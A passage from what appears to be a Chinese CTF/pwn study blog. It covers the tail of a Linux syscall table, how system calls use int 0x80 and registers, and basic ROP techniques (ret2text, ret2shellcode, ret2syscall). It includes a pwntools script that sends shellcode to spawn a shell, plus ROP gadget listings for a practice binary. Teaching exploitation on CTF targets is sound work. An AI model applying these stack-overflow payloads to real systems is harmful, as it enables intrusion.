align="left">loff_t offset</td><td align="left">loff_t len</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">286</td><td align="left">sys_timerfd_settime</td><td align="left">0x11E</td><td align="left">int ufd</td><td align="left">int flags</td><td align="left">const struct itimerspec *utmr</td><td align="left">struct itimerspec *otmr</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">287</td><td align="left">sys_timerfd_gettime</td><td align="left">0x11F</td><td align="left">int ufd</td><td align="left">struct itimerspec *otmr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">288</td><td align="left">sys_accept4</td><td align="left">0x120</td><td align="left">int fd</td><td align="left">struct sockaddr *upeer_sockaddr</td><td align="left">int *upeer_addrlen</td><td align="left">int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">289</td><td align="left">sys_signalfd4</td><td align="left">0x121</td><td align="left">int ufd</td><td align="left">sigset_t *user_mask</td><td align="left">size_t sizemask</td><td align="left">int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">290</td><td align="left">sys_eventfd2</td><td align="left">0x122</td><td align="left">unsigned int count</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">291</td><td align="left">sys_epoll_create1</td><td align="left">0x123</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">292</td><td align="left">sys_dup3</td><td align="left">0x124</td><td align="left">unsigned int oldfd</td><td align="left">unsigned int newfd</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">293</td><td align="left">sys_pipe2</td><td align="left">0x125</td><td align="left">int *filedes</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">294</td><td align="left">sys_inotify_init1</td><td align="left">0x126</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">295</td><td align="left">sys_preadv</td><td align="left">0x127</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left"></td></tr><tr><td align="left">296</td><td align="left">sys_pwritev</td><td align="left">0x128</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left"></td></tr><tr><td align="left">297</td><td align="left">sys_rt_tgsigqueueinfo</td><td align="left">0x129</td><td align="left">pid_t tgid</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">siginfo_t *uinfo</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">298</td><td align="left">sys_perf_event_open</td><td align="left">0x12A</td><td align="left">struct perf_event_attr *attr_uptr</td><td align="left">pid_t pid</td><td align="left">int cpu</td><td align="left">int group_fd</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">299</td><td align="left">sys_recvmmsg</td><td align="left">0x12B</td><td align="left">int fd</td><td align="left">struct msghdr *mmsg</td><td align="left">unsigned int vlen</td><td align="left">unsigned int flags</td><td align="left">struct timespec *timeout</td><td align="left"></td></tr><tr><td align="left">300</td><td align="left">sys_fanotify_init</td><td align="left">0x12C</td><td align="left">unsigned int flags</td><td align="left">unsigned int event_f_flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">301</td><td align="left">sys_fanotify_mark</td><td align="left">0x12D</td><td align="left">long fanotify_fd</td><td align="left">long flags</td><td align="left">__u64 mask</td><td align="left">long dfd</td><td align="left">long pathname</td><td align="left"></td></tr><tr><td align="left">302</td><td align="left">sys_prlimit64</td><td align="left">0x12E</td><td align="left">pid_t pid</td><td align="left">unsigned int resource</td><td align="left">const struct rlimit64 *new_rlim</td><td align="left">struct rlimit64 *old_rlim</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">303</td><td align="left">sys_name_to_handle_at</td><td align="left">0x12F</td><td align="left">int dfd</td><td align="left">const char *name</td><td align="left">struct file_handle *handle</td><td align="left">int *mnt_id</td><td align="left">int flag</td><td align="left"></td></tr><tr><td align="left">304</td><td align="left">sys_open_by_handle_at</td><td align="left">0x130</td><td align="left">int dfd</td><td align="left">const char *name</td><td align="left">struct file_handle *handle</td><td align="left">int *mnt_id</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">305</td><td align="left">sys_clock_adjtime</td><td align="left">0x131</td><td align="left">clockid_t which_clock</td><td align="left">struct timex *tx</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">306</td><td align="left">sys_syncfs</td><td align="left">0x132</td><td align="left">int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">307</td><td align="left">sys_sendmmsg</td><td align="left">0x133</td><td align="left">int fd</td><td align="left">struct mmsghdr *mmsg</td><td align="left">unsigned int vlen</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">308</td><td align="left">sys_setns</td><td align="left">0x134</td><td align="left">int fd</td><td align="left">int nstype</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">309</td><td align="left">sys_getcpu</td><td align="left">0x135</td><td align="left">unsigned *cpup</td><td align="left">unsigned *nodep</td><td align="left">struct getcpu_cache *unused</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">310</td><td align="left">sys_process_vm_readv</td><td align="left">0x136</td><td align="left">pid_t pid</td><td align="left">const struct iovec *lvec</td><td align="left">unsigned long liovcnt</td><td align="left">const struct iovec *rvec</td><td align="left">unsigned long riovcnt</td><td align="left">unsigned long flags</td></tr><tr><td align="left">311</td><td align="left">sys_process_vm_writev</td><td align="left">0x137</td><td align="left">pid_t pid</td><td align="left">const struct iovec *lvec</td><td align="left">unsigned long liovcnt</td><td align="left">const struct iovcc *rvec</td><td align="left">unsigned long riovcnt</td><td align="left">unsigned long flags</td></tr></tbody></table><h2 id="0x04-系统调用处理函数"><a href="#0x04-系统调用处理函数" class="headerlink" title="0x04 系统调用处理函数"></a>0x04 系统调用处理函数</h2><p>系统调用最终还是会由内核函数完成，那么为什么不直接调用内核函数呢？ 这是因为用户空间的程序无法直接执行内核代码，因为内核驻留在受保护的地址空间上，不允许用户进程在内核地址空间上读写。所以，应用程序会以某种方式通知系统，告诉内核需要执行一个函数调用，这种通知机制是靠软中断来实现的，通过引发一个异常来促使系统切换到内核态去执行异常处理程序。此时的异常处理程序就是所谓的系统调用处理程序。</p><p>系统调用是属于操作系统内核的一部分，必须以某种方式提供给进程让它们去调用。CPU可以在不同的特权级别下运行， 而相应的操作系统也有不同的运行级别，用户态和内核态。运行在内核态的进程可以毫无限制的访问各种资源， 而在用户态下的用户进程的各种操作都有着限制，比如不能随意的访问内存、不能开闭中断以及切换运行的特权级别。 所以操作系统通过中断从用户态切换到内核态。</p><p><strong>中断：</strong></p><p>中断可分为两大类：<strong>异常</strong>和<strong>中断</strong>。 异常分为<strong>故障</strong>和<strong>陷阱</strong>，<strong>特点</strong>是既不使用中断控制器，也不能被屏蔽（异常<strong>实际上是CPU发出的中断信号</strong>）。 中断分为外部<strong>可屏蔽中断</strong>和外部<strong>非屏蔽中断</strong>，所有I&#x2F;O设备产生的中断请求均引起屏蔽中断，而紧急事件（如硬件故障）引起的故障产生非屏蔽中断。</p><p>Intel x86系列微机共支持256中向量中断，Linux对256个向量的分配如下： (1) 从0～31的向量对应异常和非屏蔽中断。 (2) 从32～47的向量分配给屏蔽中断。 (3) 从48～255的向量用来标识软中断。Linux只用了其中一个（128向量即0x80向量）用来实现系统调用。 注：Linux为什么只使用一个中断号来对应所有的系统调用，而不是一个中断号对应一个系统调用？ 因为中断号是有限的，而系统调用又太多了。 <strong>Linux对系统调用的调用必须通过执行int $0x80汇编指令，这条指令会产生向量为128的编程异常。</strong></p><p>中断有两个重要的属性，<strong>中断号</strong>和<strong>中断处理程序</strong>。中断号用来标识不同的中断，不同的中断具有不同的中断处理程序。在操作系统内核中维护着一个<strong>中断向量表</strong>，这个数组存储了所有中断处理程序的地址，而中断号就是相应中断在中断向量表中的偏移量。</p><h2 id="0x05-Linux下系统调用原理"><a href="#0x05-Linux下系统调用原理" class="headerlink" title="0x05 Linux下系统调用原理"></a>0x05 Linux下系统调用原理</h2><p>系统调用拥有自己的系统调用号，系统调用表以及系统调用处理函数。<strong>一个调用号对应一个处理函数，通过处理函数和调用号在调用表中找到相应的系统调用。</strong></p><p><strong>在Linux中，EAX寄存器是负责传递系统调用号的。</strong> 以fork()为例，fork()的系统调用号为2，在执行int $0x80指令前，调用号会被存放在eax寄存器中，系统调用处理函数（中断处理函数）最终会通过系统调用号，调用正确的系统调用。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">伪代码：<br>movl <span class="hljs-built_in">eax</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure><p><img src="/%5Cimg%5C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-1.png"></p><p>系统调用除了需要传递系统调用号以外，还是需要传递参数，并且具有返回值的，那么参数是怎么传递的呢？ <strong>对于参数传递，Linux也是通过寄存器完成的。Linux最多允许向系统调用传递6个参数，分别依次由%ebx，%ecx，%edx，%esi，%edi和%ebp这个6个寄存器完成。</strong></p><p>因为exit需要一个参数1，所以这里只需要使用ebx。<strong>这6个寄存器可能已经被使用，所以在传参前必须把当前寄存器的状态保存下来，待系统调用返回后再恢复。</strong></p><p>Linux中，在用户态和内核态运行的进程使用的栈是不同的，分别叫做用户栈和内核栈， 两者各自负责相应特权级别状态下的函数调用。当进行系统调用时，进程不仅要从用户态切换到内核态，同时也要完成栈切换， 这样处于内核态的系统调用才能在内核栈上完成调用。系统调用返回时，还要切换回用户栈，继续完成用户态下的函数调用。</p><p>寄存器%esp（栈指针，指向栈顶）所在的内存空间叫做当前栈， 比如%esp在用户空间则当前栈就是用户栈，否则是内核栈。栈切换主要就是%esp在用户空间和内核空间间的来回赋值。 在Linux中，每个进程都有一个私有的内核栈，当从用户栈切换到内核栈时，需完成保存%esp以及相关寄存器的值（%ebx，%ecx…）并将%esp设置成内核栈的相应值。而从内核栈切换会用户栈时，需要恢复用户栈的%esp及相关寄存器的值以及保存内核栈的信息。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本ROP</title>
    <link href="/2025/01/22/%E5%9F%BA%E6%9C%ACROP/"/>
    <url>/2025/01/22/%E5%9F%BA%E6%9C%ACROP/</url>
    
    <content type="html"><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>ret2text 即控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是 gadgets)，这就是我们所要说的ROP。这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><p>ret2text（ret to text），也就是说我们的利用点在原文件中寻找相对应的代码即可（进程存在危险函数如system(“&#x2F;bin”)或execv(“&#x2F;bin&#x2F;sh”)的片段，可以直接劫持返回地址到目标函数地址上。从而getshell。），控制程序执行程序本身已有的的代码 (.text)。</p><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p>开启了NX，栈上无法写入shellcode</p><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h3><p>ret2shellcode，即控制程序执行 shellcode代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。说白了，程序中这次没有类似于system(“&#x2F;bin&#x2F;sh”)后门函数，需要自己来填充。</p><h3 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h3><ol><li>存在溢出，并且还要能够控制返回地址。</li><li>运行时，shellcode 所在的区域要拥有执行权限（NX保护关闭、bss段可执行）</li><li>操作系统还需要关闭 ASLR (地址空间布局随机化) 保护 。（或关闭PIE保护）</li></ol><h3 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h3><ul><li>先使用cyclic测试出溢出点，构造初步的payload</li><li>确定程序中的溢出位，看是否可在bss段传入数据</li><li>使用GDB的vmmap查看bss段（一般为用户提交的变量在bss段中）</li><li>先发送为shellcode的数据写入到bss段</li><li>在将程序溢出到上一步用户提交变量的地址</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>以ret2shellcode为例</p><p>查一下保护，没啥保护，32位程序</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">unknown</span> <span class="hljs-bullet">-</span> <span class="hljs-string">GNU_STACK</span> <span class="hljs-string">missing</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Executable</span><br><span class="hljs-attr">RWX:</span>        <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><span class="hljs-attr">Debuginfo:</span>  <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure><p>看一下源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No system for you this time !!!&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0x64u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bye bye ~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>它将s的值复制到了buf2处，而buf2处于bss段，地址为0x0804A080</p><p>动态调试一下，看看bss段是否可执行。（无法启动调试就给ubuntu加装32位运行库）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Start</span>      End        PermName<br><span class="hljs-attribute">0x08048000</span> <span class="hljs-number">0</span>x08049000 r-xp/home/xyq/BUUCTF/ret2shellcode<br><span class="hljs-attribute">0x08049000</span> <span class="hljs-number">0</span>x0804a000 r-xp/home/xyq/BUUCTF/ret2shellcode<br><span class="hljs-attribute">0x0804a000</span> <span class="hljs-number">0</span>x0804b000 rwxp/home/xyq/BUUCTF/ret2shellcode<br><span class="hljs-attribute">0xf7dde000</span> <span class="hljs-number">0</span>xf7fb3000 r-xp/lib/i386-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7fb3000</span> <span class="hljs-number">0</span>xf7fb4000 ---p/lib/i386-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7fb4000</span> <span class="hljs-number">0</span>xf7fb6000 r-xp/lib/i386-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7fb6000</span> <span class="hljs-number">0</span>xf7fb7000 rwxp/lib/i386-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7fb7000</span> <span class="hljs-number">0</span>xf7fba000 rwxpmapped<br><span class="hljs-attribute">0xf7fcf000</span> <span class="hljs-number">0</span>xf7fd1000 rwxpmapped<br><span class="hljs-attribute">0xf7fd1000</span> <span class="hljs-number">0</span>xf7fd4000 r--p<span class="hljs-meta">[vvar]</span><br><span class="hljs-attribute">0xf7fd4000</span> <span class="hljs-number">0</span>xf7fd6000 r-xp<span class="hljs-meta">[vdso]</span><br><span class="hljs-attribute">0xf7fd6000</span> <span class="hljs-number">0</span>xf7ffc000 r-xp/lib/i386-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7ffc000</span> <span class="hljs-number">0</span>xf7ffd000 r-xp/lib/i386-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xf7ffd000</span> <span class="hljs-number">0</span>xf7ffe000 rwxp/lib/i386-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so<br><span class="hljs-attribute">0xfffdd000</span> <span class="hljs-number">0</span>xffffe000 rwxp<span class="hljs-meta">[stack]</span><br></code></pre></td></tr></table></figure><p>这就是这个程序的虚拟内存，我们可以看到0x0804A080处于0x0804a000 0x0804b000之间，说明那里就是bss段，同时，这里的bss段是可执行的。</p><p>构造一个长一点的字符串手动测量main的栈的长度，为112字节</p><p>然后我们就可以构造exp了，具体示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br>shellcode  = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>其中，shellcraft.sh()就相当于执行了system(‘&#x2F;bin&#x2F;sh’)或evecve(‘&#x2F;bin&#x2F;sh’)<br>shellcode.ljust(112, ‘A’)的重点在于ljust(112, ‘A’)，我们知道shellcode是一个字符型，而ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。语法为<code>str.ljust(width[, fillchar])</code>，其中width – 指定字符串长度。fillchar – 填充字符，默认为空格。</p><h2 id="ret2syscall（32位ELF）"><a href="#ret2syscall（32位ELF）" class="headerlink" title="ret2syscall（32位ELF）"></a>ret2syscall（32位ELF）</h2><h3 id="原理：-2"><a href="#原理：-2" class="headerlink" title="原理："></a>原理：</h3><p>顾名思义，ret to syscall，就是调用系统函数以达到getshell的目的<br>在计算中，系统调用是一种编程方式，计算机程序从该程序中向执行其的操作系统内核请求服务。这可能包括与硬件相关的服务（例如，访问硬盘驱动器），创建和执行新进程以及与诸如进程调度之类的集成内核服务进行通信。系统调用提供了进程与操作系统之间的基本接口。<br>至于系统调用在其中充当什么角色，稍后再看，现在我们要做的是：让程序调用<strong>execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)函数即可拿到shell</strong> </p><h3 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><ol><li>首先将系统调用号 传入 <code>eax</code></li><li>然后将参数 从左到右 依次存入 <code>ebx</code>，<code>ecx</code>，<code>edx</code>寄存器中</li><li>回值存在<code>eax</code>寄存器</li></ol><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><ol><li>首先将系统调用号 传入 <code>rax</code></li><li>然后将参数 从左到右 依次存入<code>rdi</code>，<code>rsi</code>，<code>rdx</code>寄存器中</li><li>返回值存在<code>rax</code>寄存器</li></ol><h3 id="常见的系统调用号"><a href="#常见的系统调用号" class="headerlink" title="常见的系统调用号"></a>常见的系统调用号</h3><h4 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h4><table><thead><tr><th>syscall</th><th>%eax</th><th>%ebx(arg0)</th><th>%ecx(arg1)</th><th>%edx(arg2)</th></tr></thead><tbody><tr><td>read</td><td>0x03</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>write</td><td>0x04</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td></tr><tr><td>execve</td><td>0x0b</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td></tr></tbody></table><h4 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h4><table><thead><tr><th>syscall</th><th>%eax</th><th>%ebx(arg0)</th><th>%ecx(arg1)</th><th>%edx(arg2)</th></tr></thead><tbody><tr><td>sys_read</td><td>0x0</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>sys_write</td><td>0x1</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td></tr><tr><td>sys_execve</td><td>0x3B</td><td>const char *filename</td><td>const char *const argv[]</td><td>const char *const envp[]</td></tr></tbody></table><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><p>调用此函数的具体的步骤是这样的：因为该程序是 32 位，所以：</p><p>eax 应该为 0xb<br>ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以<br>ecx 应该为 0<br>edx 应该为 0<br>最后再执行int 0x80触发中断即可执行execve()获取shell</p><p>这么写的原因是：</p><p>系统在运行的时候会使用上面四个寄存器，所以那么上面内容我们可以写为int 0x80(eax,ebx,ecx,edx)。只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用。</p><p>在我们最开始学习汇编函数的时候，我们最常用到的就是push，pop，ret指令，而这一次我们将使用pop和ret的组合来控制寄存器的值以及执行方向。例如：在一个栈上，假设栈顶的值为2，当我们pop eax,时，2就会存进eax寄存器。同样的，我们可以用同样的方法完成execve()函数参数的控制</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span># 系统调用号载入， execve为<span class="hljs-number">0xb</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span># 第一个参数， /bin/sh的string<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ecx</span># 第二个参数，<span class="hljs-number">0</span> 空指针，没有意义<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">edx</span># 第三个参数，<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><strong>补充：</strong>在 64 位系统中，通过syscall指令实现系统调用，系统调用号放在RAX寄存器中，参数放置在RDI、RSI、RDX、R10、R8和R9等寄存器中。</p><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p>以rop为例</p><p>查一下保护，开启了NX保护了，不能使用ret2shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Arch:       i386-32-little<br>RELRO:      Partial RELRO<br>Stack:      No canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x8048000)<br>Stripped:   No<br>Debuginfo:  Yes<br></code></pre></td></tr></table></figure><p>手动的测量栈的长度，位112字节</p><p>之后，我们要用gadgets来获取shell，而对应的 shell 获取则是利用系统调用</p><hr><p><strong>补充：</strong>gadgets</p><p>“Gadgets”  通常是指一系列可以被攻击者利用的机器码指令序列。在漏洞利用场景中，特别是在基于栈溢出或堆溢出等内存破坏漏洞利用时，攻击者会寻找程序中已经存在的代码片段（即 gadgets），这些代码片段可以帮助他们实现一些特定的操作，如修改控制流、读写内存等。</p><hr><p>在这里，我们要利用execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)系统调用来获取 shell。</p><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。具体寻找 gadgets的方法，我们可以使用 ropgadgets 这个工具。工具的具体使用在<code>ropgadgets.md</code></p><p>首先，我们来寻找控制 eax 的gadgets：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x0809ddda</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x080bb196</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x0807217a</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; ret 0x80e</span><br><span class="hljs-number">0x0804f704</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; ret 3</span><br><span class="hljs-number">0x0809ddd9</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">es</span> <span class="hljs-comment">; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></code></pre></td></tr></table></figure><p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。<br>类似的，我们可以得到控制其它寄存器的 gadgets</p><p>ebx：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x0809dde2</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ds</span> <span class="hljs-comment">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x0809ddda</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x0805b6ed</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebp</span> <span class="hljs-comment">; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x0809e1d4</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x080be23f</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop edi ; ret</span><br><span class="hljs-number">0x0806eb69</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span class="hljs-comment">; pop edx ; ret</span><br><span class="hljs-number">0x08092258</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebx</span> <span 